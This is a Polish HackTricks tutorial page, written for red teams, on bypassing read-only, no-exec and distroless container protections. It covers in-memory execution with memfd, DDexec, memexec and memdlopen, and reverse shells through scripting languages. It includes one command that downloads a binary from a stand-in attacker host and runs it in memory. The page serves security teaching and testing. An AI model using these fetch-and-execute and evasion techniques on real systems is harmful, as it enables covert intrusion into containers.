# Bypass FS protections: read-only / no-exec / Distroless

{{#include ../../../../banners/hacktricks-training.md}}

## Filmy

Na poniższych filmach znajdziesz dokładniejsze wyjaśnienie technik wspomnianych na tej stronie:<sup>[[1]](#references)[[2]](#references)</sup>

- [**DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion**](https://www.youtube.com/watch?v=poHirez8jk4)<sup>[[1]](#references)</sup>
- [**Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023**](https://www.youtube.com/watch?v=VM_gjjiARaU)<sup>[[2]](#references)</sup>

## Scenariusz read-only / no-exec

Coraz częściej można spotkać maszyny z zamontowanym **read-only (ro) file system protection**, szczególnie w kontenerach. Dzieje się tak, ponieważ uruchomienie kontenera z ro file system jest tak proste, jak ustawienie **`readOnlyRootFilesystem: true`** w `securitycontext`:

<pre class="language-yaml"><code class="lang-yaml">apiVersion: v1
kind: Pod
metadata:
name: alpine-pod
spec:
containers:
- name: alpine
image: alpine
securityContext:
<strong>      readOnlyRootFilesystem: true
</strong>    command: ["sh", "-c", "while true; do sleep 1000; done"]
</code></pre>

Jednak nawet jeśli file system jest zamontowany jako ro, **`/dev/shm`** nadal będzie zapisywalny, więc stwierdzenie, że nie możemy niczego zapisać na dysku, jest nieprawdziwe. Ten folder będzie jednak **zamontowany z no-exec protection**, dlatego po pobraniu tutaj binary **nie będzie można go wykonać**.

> [!WARNING]
> Z perspektywy red teamu utrudnia to **pobieranie i wykonywanie** binary, których nie ma już w systemie (takich jak backdoory lub enumeratory, np. `kubectl`).

## Najłatwiejszy bypass: skrypty

Zauważ, że wspomniałem o binary — możesz **wykonać dowolny skrypt**, o ile interpreter znajduje się na maszynie, na przykład **shell script**, jeśli dostępny jest `sh`, lub **python** **script**, jeśli zainstalowany jest `python`.

Nie wystarczy to jednak do wykonania binary backdoora ani innych binary tools, które mogą być potrzebne.

## Memory Bypasses

Jeśli chcesz wykonać binary, ale file system na to nie pozwala, najlepszym sposobem jest **wykonanie go z pamięci**, ponieważ **ochrony nie mają tam zastosowania**.

### FD + exec syscall bypass

Jeśli na maszynie dostępne są zaawansowane script engines, takie jak **Python**, **Perl** lub **Ruby**, możesz pobrać binary do wykonania do pamięci, zapisać go w memory file descriptor (`create_memfd` syscall), który nie będzie objęty tymi ochronami, a następnie wywołać **`exec` syscall**, wskazując **fd jako plik do wykonania**.

Możesz w tym celu łatwo użyć projektu [**fileless-elf-exec**](https://github.com/nnsee/fileless-elf-exec). Możesz przekazać mu binary, a wygeneruje skrypt we wskazanym języku, zawierający **skompresowany i zakodowany za pomocą b64 binary** oraz instrukcje do jego **zdekodowania i rozpakowania** w **fd**, utworzonym przez wywołanie `create_memfd` syscall, a także wywołanie **exec** syscall w celu jego uruchomienia.

> [!WARNING]
> Nie działa to w innych scripting languages, takich jak PHP lub Node, ponieważ nie mają one **domyślnego sposobu wywoływania raw syscalls** ze skryptu. Nie można więc wywołać `create_memfd`, aby utworzyć **memory fd** do przechowywania binary.
>
> Ponadto utworzenie **regular fd** z plikiem w `/dev/shm` nie zadziała, ponieważ nie będzie można go uruchomić — zastosowanie znajdzie **no-exec protection**.

### DDexec / EverythingExec

[**DDexec / EverythingExec**](https://github.com/arget13/DDexec) to technika umożliwiająca **modyfikowanie pamięci własnego procesu** poprzez nadpisanie jego **`/proc/self/mem`**.

Dzięki **kontrolowaniu kodu assembly** wykonywanego przez proces możesz zapisać **shellcode** i „zmienić” proces tak, aby **wykonywał dowolny kod**.

> [!TIP]
> **DDexec / EverythingExec** umożliwia załadowanie i **wykonanie** własnego **shellcode'u** lub **dowolnego binary** z **pamięci**.
```bash
# Basic example
wget -O- https://attacker.com/binary.elf | base64 -w0 | bash ddexec.sh argv0 foo bar
```
Więcej informacji o tej technice znajdziesz na Githubie lub:

{{#ref}}
ddexec.md
{{#endref}}

### MemExec

[**Memexec**](https://github.com/arget13/memexec) to naturalny kolejny krok po DDexec. Jest to **shellcode DDexec uruchomiony jako demon**, więc za każdym razem, gdy chcesz **uruchomić inny plik binarny**, nie musisz ponownie uruchamiać DDexec — możesz po prostu uruchomić shellcode memexec za pomocą techniki DDexec, a następnie **komunikować się z tym demonem, aby przekazać mu nowe pliki binarne do załadowania i uruchomienia**.

Przykład użycia **memexec do wykonywania plików binarnych z poziomu PHP reverse shell** znajdziesz tutaj: [https://github.com/arget13/memexec/blob/main/a.php](https://github.com/arget13/memexec/blob/main/a.php).

### Memdlopen

Technika [**memdlopen**](https://github.com/arget13/memdlopen), podobnie jak DDexec, umożliwia **łatwiejsze ładowanie plików binarnych** do pamięci w celu ich późniejszego uruchomienia. Może pozwolić nawet na ładowanie plików binarnych wraz z zależnościami.

## Ominięcie Distroless

Dedykowane wyjaśnienie, **czym właściwie jest distroless**, kiedy pomaga, kiedy nie pomaga oraz jak zmienia działania post-exploitation w kontenerach, znajdziesz tutaj:

{{#ref}}
../../../containers-namespaces/container-security/distroless.md
{{#endref}}

### Czym jest distroless

Kontenery distroless zawierają tylko **absolutne minimum komponentów niezbędnych do uruchomienia konkretnej aplikacji lub usługi**, takich jak biblioteki i zależności runtime, ale nie zawierają większych komponentów, takich jak package manager, shell ani narzędzia systemowe.

Celem kontenerów distroless jest **zmniejszenie attack surface kontenerów poprzez usunięcie zbędnych komponentów** i zminimalizowanie liczby podatności, które mogą zostać wykorzystane.

### Reverse Shell

W kontenerze distroless możesz **nie znaleźć nawet `sh` ani `bash`**, aby uzyskać zwykły shell. Nie znajdziesz również plików binarnych takich jak `ls`, `whoami`, `id`... ani żadnych innych, których zwykle używasz w systemie.

> [!WARNING]
> Dlatego **nie będziesz** w stanie uzyskać **reverse shell** ani **enumerować** systemu w zwykły sposób.

Jeśli jednak zaatakowany kontener uruchamia na przykład aplikację webową Flask, Python będzie zainstalowany, więc możesz uzyskać **Python reverse shell**. Jeśli uruchamia Node, możesz uzyskać Node rev shell — podobnie jak w przypadku większości **języków skryptowych**.

> [!TIP]
> Korzystając z języka skryptowego, możesz **enumerować system**, używając możliwości tego języka.

Jeśli nie ma zabezpieczeń **`read-only/no-exec`**, możesz wykorzystać swój reverse shell do **zapisania plików binarnych w systemie plików** i ich **uruchomienia**.

> [!TIP]
> Jednak w tego rodzaju kontenerach te zabezpieczenia zwykle będą obecne, ale możesz użyć **wcześniej opisanych technik wykonywania z pamięci, aby je ominąć**.

Przykłady tego, jak **wykorzystać niektóre podatności RCE** do uzyskania **reverse shelli** w językach skryptowych i wykonywania plików binarnych z pamięci, znajdziesz w [**https://github.com/carlospolop/DistrolessRCE**](https://github.com/carlospolop/DistrolessRCE).

## Referencje

- [1] [DEF CON 31 - Exploring Linux Memory Manipulation for Stealth and Evasion](https://www.youtube.com/watch?v=poHirez8jk4)
- [2] [Stealth intrusions with DDexec-ng & in-memory dlopen() - HackTricks Track 2023](https://www.youtube.com/watch?v=VM_gjjiARaU)

{{#include ../../../../banners/hacktricks-training.md}}
